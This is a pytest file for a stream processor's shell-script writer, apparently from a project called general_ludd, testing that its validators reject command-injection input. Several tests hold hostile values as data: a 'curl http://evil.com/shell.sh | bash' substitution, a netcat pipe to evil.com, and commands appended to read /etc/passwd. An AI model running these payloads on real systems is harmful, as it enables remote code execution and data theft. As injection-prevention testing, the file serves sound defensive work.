"""Test H-STREAM-PROCESSOR-CMDI: shell injection prevention in stream processor."""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from general_ludd.stream import _FORBIDDEN_SHELL_CHARS, _SAFE_BINARY_RE, RoleCloner


class TestSafeBinaryPattern:
    def test_accepts_simple_binary_name(self):
        assert _SAFE_BINARY_RE.match("whisper.cpp")

    def test_accepts_path(self):
        assert _SAFE_BINARY_RE.match("/usr/bin/whisper.cpp")

    def test_accepts_hyphenated(self):
        assert _SAFE_BINARY_RE.match("my-bin")

    def test_rejects_space(self):
        assert _SAFE_BINARY_RE.match("cat /etc/passwd") is None

    def test_rejects_semicolon(self):
        assert _SAFE_BINARY_RE.match("cat;rm") is None

    def test_rejects_dollar(self):
        assert _SAFE_BINARY_RE.match("$(whoami)") is None

    def test_rejects_pipe(self):
        assert _SAFE_BINARY_RE.match("cat|nc") is None

    def test_rejects_backtick(self):
        assert _SAFE_BINARY_RE.match("`whoami`") is None

    def test_rejects_newline(self):
        assert _SAFE_BINARY_RE.match("cat\n/etc/hosts") is None

    def test_rejects_empty(self):
        assert _SAFE_BINARY_RE.match("") is None


class TestForbiddenShellChars:
    def test_space_not_forbidden(self):
        assert " " not in _FORBIDDEN_SHELL_CHARS

    def test_dollar_forbidden(self):
        assert "$" in _FORBIDDEN_SHELL_CHARS

    def test_semicolon_forbidden(self):
        assert ";" in _FORBIDDEN_SHELL_CHARS

    def test_pipe_forbidden(self):
        assert "|" in _FORBIDDEN_SHELL_CHARS

    def test_backtick_forbidden(self):
        assert "`" in _FORBIDDEN_SHELL_CHARS

    def test_newline_forbidden(self):
        assert "\n" in _FORBIDDEN_SHELL_CHARS


class TestWriteShellProcessorNormal:
    def test_normal_args_accepted(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "/usr/bin/whisper-cpp",
                    "args": "-m model.bin -t 4"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "/usr/bin/whisper-cpp" in content
            assert "-m model.bin -t 4" in content
            assert "$CHUNK_PATH" in content

    def test_default_binary_uses_kind(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "whisper" in content

    def test_empty_args_accepted(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "ffmpeg", "binary": "/usr/bin/ffmpeg", "args": ""}
            result = cloner._write_shell_processor(clone_path, proc, kind="ffmpeg")
            content = result.read_text()
            assert "/usr/bin/ffmpeg" in content

    def test_script_executable(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            import stat
            mode = result.stat().st_mode
            assert mode & stat.S_IXUSR
            assert mode & stat.S_IXGRP
            assert mode & stat.S_IXOTH


class TestWriteShellProcessorRejectsInjection:
    def test_binary_semicolon_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "cat /etc/passwd;"}
            with pytest.raises(ValueError, match="unsafe characters"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_binary_command_substitution_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "$(whoami)"}
            with pytest.raises(ValueError, match="unsafe characters"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_binary_pipe_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "cat | nc evil.com 4444"}
            with pytest.raises(ValueError, match="unsafe characters"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_semicolon_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": "-m model.bin ; cat /etc/passwd"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_command_substitution_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": "$(curl http://evil.com/shell.sh | bash)"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_backtick_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "`id`"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_pipe_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "-m model.bin | nc evil"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_newline_injection_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": '-m "model\ncat /etc/passwd #"'}
            with pytest.raises(ValueError, match="newline"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_args_ampersand_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "& ping evil.com &"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_binary_path_traversal_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "../../../etc/passwd"}
            with pytest.raises(ValueError, match="unsafe characters"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_quoted_binary_defense_in_depth(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "/usr/bin/whisper-cpp",
                    "args": "-m model.bin"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "/usr/bin/whisper-cpp" in content
            assert "-m model.bin" in content


class TestMaterializeProcessorRejects:
    def test_whisper_injection_via_materialize(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc: dict[str, object] = {"tool": "whisper.cpp", "binary": "cat /etc/passwd;"}
            with pytest.raises(ValueError, match="unsafe"):
                cloner.materialize_processor(clone_path, proc)

    def test_ffmpeg_injection_via_materialize(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc: dict[str, object] = {"tool": "ffmpeg", "args": "$(id)"}
            with pytest.raises(ValueError, match="forbidden shell character"):
                cloner.materialize_processor(clone_path, proc)

    def test_unknown_tool_still_rejected(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc: dict[str, object] = {"tool": "unknown"}
            with pytest.raises(ValueError, match="Unknown processor tool"):
                cloner.materialize_processor(clone_path, proc)


class TestRouterLevelValidation:
    """Verify the router-level validation in stream.py rejects bad input early."""

    def test_router_imports_constants(self):
        from general_ludd.routers.stream import _SAFE_BINARY_RE as rtr_re
        assert rtr_re is _SAFE_BINARY_RE

    def test_safe_binary_match_path(self):
        assert _SAFE_BINARY_RE.match("/usr/local/bin/my-tool")

    def test_safe_binary_reject_double_dot(self):
        assert _SAFE_BINARY_RE.match("../../etc/passwd") is None
